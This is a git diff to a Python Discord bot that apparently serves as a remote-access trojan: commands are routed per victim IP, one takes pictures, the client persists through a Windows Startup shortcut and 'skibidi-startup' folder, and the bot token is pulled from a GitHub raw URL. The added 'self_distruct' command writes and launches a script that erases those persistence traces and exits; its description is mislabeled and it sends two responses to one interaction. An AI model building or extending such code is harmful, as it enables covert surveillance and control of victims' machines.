@@ -239,6 +239,41 @@ async def take_picture(interaction : Interaction):
                 await interaction.send(embed=embed, file=file)
                 await interaction.delete_original_message()
 
+@client.slash_command(guild_ids=testServerId, description="Sends a screenshot of the client's view.")
+async def self_distruct(interaction : Interaction):
+    category = interaction.channel.category
+    if str(category) == str(ip):
+        
+        user_id = interaction.user.id
+        await interaction.response.send_message("Self-destructing client...")
+        await interaction.response.send_message("Client most likely self destructed!")
+        script_content = """
+import shutil
+import os
+from pathlib import Path
+import time
+
+time.sleep(1)
+
+user_profile = os.environ['USERPROFILE']
+target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
+shutil.rmtree(os.path.join(target_path, "skibidi-startup"))
+shutil.rmtree(os.path.join(target_path, "skibidi-startup"))
+startup_dir = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
+shortcut_name="MyPythonScript"
+shortcut_path = startup_dir / f"{shortcut_name}.lnk"
+os.remove(shortcut_path)
+"""
+
+        script_file = "self-destruct.py"
+        user_profile = os.environ['USERPROFILE']
+        target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
+        with open(os.path.join(target_path, script_file), "w") as file:
+            file.write(script_content)
+        subprocess.Popen(["python", os.path.join(target_path, "self-destruct.py")])
+        sys.exit(0)
+        
+
 r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/tok")
 token = r.text
 stripped_string = token[1:]
